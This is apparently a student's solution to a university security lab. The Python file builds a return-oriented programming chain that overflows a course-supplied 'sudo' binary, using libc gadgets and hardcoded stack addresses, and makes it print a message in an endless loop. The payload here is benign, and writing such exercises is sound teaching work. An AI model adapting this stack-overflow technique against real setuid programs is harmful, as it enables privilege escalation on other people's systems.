import os
import sys
import base64
import struct

import addresses
from infosec.core import assemble
from search import GadgetSearch


PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'


def get_string(student_id):
    return 'Take me (%s) to your leader!' % student_id


def get_arg() -> bytes:
    """
    This function returns the (pre-encoded) `password` argument to be sent to
    the `sudo` program.

    This data should cause the program to execute our ROP-chain for printing our
    message in an endless loop. Make sure to return a `bytes` object and not an
    `str` object.

    NOTES:
    1. Use `addresses.PUTS` to get the address of the `puts` function.
    2. Don't write addresses of gadgets directly - use the search object to
       find the address of the gadget dynamically.

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Returns:
         The bytes of the password argument.
    """
    search = GadgetSearch(LIBC_DUMP_PATH)
    # TODO: IMPLEMENT THIS FUNCTION
    msg=(b'a'*135)
    msg+=struct.pack('<I',search.find('POP EBP'))
    msg+=struct.pack('<I',addresses.PUTS)
    msg+=struct.pack('<I',addresses.PUTS)
    msg+=struct.pack('<I',search.find('ADD ESP,4'))
    msg+=struct.pack('<I',0xbfffdff8)
    msg+=struct.pack('<I',search.find('POP ESP'))
    msg+=struct.pack('<I',0xbfffdfd8)
    msg+=get_string(322776063).encode('utf-8')
    return msg


def main(argv):
    # WARNING: DON'T EDIT THIS FUNCTION!
    # NOTE: os.execl() accepts `bytes` as well as `str`, so we will use `bytes`.
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, base64.b64encode(get_arg()))


if __name__ == '__main__':
    main(sys.argv)
